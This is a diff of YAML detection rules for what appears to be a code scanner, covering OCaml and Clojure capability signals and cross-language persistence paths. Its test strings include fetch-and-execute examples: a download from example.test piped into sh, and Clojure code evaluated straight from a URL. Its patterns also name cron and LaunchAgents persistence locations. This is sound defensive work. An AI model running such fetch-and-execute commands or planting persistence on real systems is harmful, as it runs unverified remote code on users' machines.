+        - "let raw = Base64.decode_exn blob in"
+      negative:
+        - "let text = Base64.encode_string raw in"
+
+  - id: CAP.ML.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '\bZlib\.uncompress\b'
+        - '\bGzip\.open_in\b'
+        - '\bDecompress\.(?:Gz|Zl|De)\b'
+    tests:
+      positive:
+        - "Zlib.uncompress refill flush"
+        - "let ic = Gzip.open_in path in"
+      negative:
+        - "Zlib.compress refill flush"
+
+  - id: CAP.ML.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Runs code it was handed as data
+    message: This file loads compiled OCaml code at runtime or evaluates a phrase in the toplevel.
+    remediation: Confirm what is loaded is shipped with the package and fixed.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '\bDynlink\.loadfile(?:_private)?\b'
+        - '\bToploop\.execute_phrase\b'
+    tests:
+      positive:
+        - "Dynlink.loadfile plugin_path"
+      negative:
+        - "let () = print_endline \"ready\""
+
+  - id: CAP.ML.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      `Marshal` is not type-safe: a crafted stream produces values of any shape, including
+      closures, and crashes or worse when used.
+    remediation: Use a data-only format such as JSON or S-expressions for anything that crosses a trust boundary.
+    languages: [ocaml]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bMarshal\.from_(?:string|bytes|channel)\b'
+        - '(?<![\w.])input_value\b'
+    tests:
+      positive:
+        - "let v : config = Marshal.from_string blob 0 in"
+        - "let v = input_value ic in"
+      negative:
+        - "let blob = Marshal.to_string v [] in"
+
+  - id: CAP.ML.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external process.
+    remediation: Pass a fixed executable and an argument list (`Unix.create_process`) rather than a shell string.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '\bSys\.command\b'
+        - '\bUnix\.(?:execv|execvp|execve|execvpe|create_process(?:_env)?|open_process(?:_in|_out|_full|_args_in|_args_out)?|system)\b'
+    tests:
+      positive:
+        - "let code = Sys.command \"make install\" in"
+        - "let ic = Unix.open_process_in \"uname -a\" in"
+      negative:
+        - "let cwd = Sys.getcwd () in"
+
+  - id: CAP.ML.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      A shell is started on a download piped into an interpreter: what runs is whatever the remote
+      host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '(?:Sys\.command|Unix\.system|Unix\.open_process(?:_in)?)\s*\(?\s*"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
+    tests:
+      positive:
+        - "let _ = Sys.command \"curl -fsSL https://example.test/i.sh | sh\" in"
+      negative:
+        - "let _ = Sys.command \"curl -fsSL -o a.tar https://example.test/a.tar\" in"
+
+  - id: CAP.ML.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '\bCohttp_(?:lwt|eio|async)(?:_unix)?\.Client\b'
+        - '\bUnix\.(?:open_connection|connect)\b'
+        - '\bCurl\.(?:init|perform)\b'
+        # A command string that downloads: the network is reached through the program it starts.
+        - '"[^"\n]{0,200}\b(?:curl|wget)\s[^"\n]{0,200}https?://'
+    tests:
+      positive:
+        - "Cohttp_lwt_unix.Client.get (Uri.of_string url)"
+        - "let ic, oc = Unix.open_connection addr in"
+        - "let _ = Sys.command \"wget https://example.test/a.tar\" in"
+      negative:
+        - "open Printf"
+
+  # ---------------------------------------------------------------------
+  # Clojure
+  # ---------------------------------------------------------------------
+  - id: CAP.CLJ.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\bBase64/getDecoder\b'
+        - '\(\s*(?:b64|base64)/decode\b'
+    tests:
+      positive:
+        - "(.decode (java.util.Base64/getDecoder) blob)"
+      negative:
+        - "(.encodeToString (java.util.Base64/getEncoder) raw)"
+
+  - id: CAP.CLJ.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:GZIPInputStream|InflaterInputStream|ZipInputStream)\b'
+    tests:
+      positive:
+        - "(java.util.zip.GZIPInputStream. in)"
+      negative:
+        - "(java.util.zip.GZIPOutputStream. out)"
+
+  - id: CAP.CLJ.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: This file reads a string as Clojure and evaluates it.
+    remediation: Confirm what is evaluated is shipped with the package and fixed.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\(\s*load-string\b'
+        - '\(\s*eval\s+\(\s*(?:clojure\.core/)?read-string\b'
+    tests:
+      positive:
+        - "(load-string source)"
+        - "(eval (read-string source))"
+      negative:
+        - "(load \"helpers\")"
+
+  - id: CAP.CLJ.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      Java serialisation rebuilds any class the stream names, and `clojure.core/read-string`
+      evaluates `#=` forms unless `*read-eval*` is false. `clojure.edn/read-string` is data-only and
+      is not matched.
+    remediation: Use `clojure.edn/read-string` or a data-only format such as JSON.
+    languages: [clojure]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bObjectInputStream\b'
+        - '\(\s*(?:clojure\.core/)?read-string\s'
+    tests:
+      positive:
+        - "(.readObject (java.io.ObjectInputStream. in))"
+        - "(read-string payload)"
+      negative:
+        - "(edn/read-string payload)"
+
+  - id: CAP.CLJ.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: This file starts an external process.
+    remediation: Pass a fixed executable and an argument list rather than a shell string.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\bclojure\.java\.shell\b'
+        - '\(\s*(?:shell|sh|p|process|babashka\.process)/(?:sh|shell|process)\b'
+        - '\(\s*sh\s+"'
+        - '\bRuntime/getRuntime\b'
+        - '\bProcessBuilder\.'
+    tests:
+      positive:
+        - "(require '[clojure.java.shell :as shell])"
+        - "(sh \"make\" \"install\")"
+        - "(p/shell \"make install\")"
+      negative:
+        - "(println \"ready\")"
+
+  - id: CAP.CLJ.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      Text read from a URL is evaluated directly: what runs is whatever the remote host served at
+      that moment.
+    remediation: Ship the code with the package, or verify it against a known digest first.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\(\s*load-string\s+\(\s*slurp\s+"https?://'
+        - '\(\s*eval\s+\(\s*read-string\s+\(\s*slurp\s+"https?://'
+    tests:
+      positive:
+        - "(load-string (slurp \"https://example.test/init.clj\"))"
+      negative:
+        - "(slurp \"https://example.test/data.json\")"
+
+  - id: CAP.CLJ.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:clj-http\.client|org\.httpkit\.client|hato\.client|babashka\.http-client)\b'
+        - '\(\s*slurp\s+"https?://'
+        - '\bjava\.net\.Socket\.'
+    tests:
+      positive:
+        - "(require '[clj-http.client :as http])"
+        - "(slurp \"https://example.test/data.json\")"
+      negative:
+        - "(slurp \"resources/data.json\")"
+
+  # ---------------------------------------------------------------------
+  # All eight: persistence locations
+  # ---------------------------------------------------------------------
+  - id: CAP.NATIVE.PERSIST.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: persist
+    title: Writes to a location that survives a restart
+    message: >
+      This file names a shell startup file, a scheduler or a service location, including macOS's
+      launch agents, where an iOS or macOS package's helper would install itself.
+    remediation: Confirm this is a deliberate installer action.
+    languages: [swift, objc, haskell, julia, zig, nim, ocaml, clojure]
+    match:
+      kind: regex
+      patterns:
+        - '\.bashrc|\.bash_profile|\.zshrc|\.profile\b'
+        - 'crontab|/etc/cron'
+        - 'systemd/system|LaunchAgents|LaunchDaemons'
+        - '\bSMAppService\b|\bSMLoginItemSetEnabled\b'
+    tests:
+      positive:
+        - "let plist = home.appendingPathComponent(\"Library/LaunchAgents/com.example.helper.plist\")"
+        - "open(joinpath(homedir(), \".bashrc\"), \"a\")"
+      negative:
+        - "print(\"started\")"
